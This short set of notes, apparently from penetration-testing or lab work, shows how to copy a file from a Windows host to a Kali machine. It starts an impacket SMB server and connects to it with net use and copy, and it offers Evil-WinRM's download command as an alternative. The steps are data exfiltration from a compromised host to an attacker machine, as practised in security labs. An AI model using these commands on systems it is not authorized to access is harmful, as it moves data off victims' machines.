## 1. Kali — receive folder and SMB server

**Kali**

```bash
mkdir -p ~/transfer
sudo impacket-smbserver share ~/transfer -smb2support -user transfer -password 'TRANSFER_PASSWORD'
```

Keep this terminal running. Replace TRANSFER_PASSWORD in both commands.

## 2. Windows — connect and copy

**Windows cmd.exe**

```bash
net use \\KALI_IP\share /user:transfer TRANSFER_PASSWORD
copy C:\path\file.zip \\KALI_IP\share\file.zip
```

The file appears in ~/transfer on Kali.

## Alternative — if already in Evil-WinRM

**Evil-WinRM prompt**

```bash
download C:\path\file.zip ./file.zip
```

Saves the file on the Kali machine running Evil-WinRM.
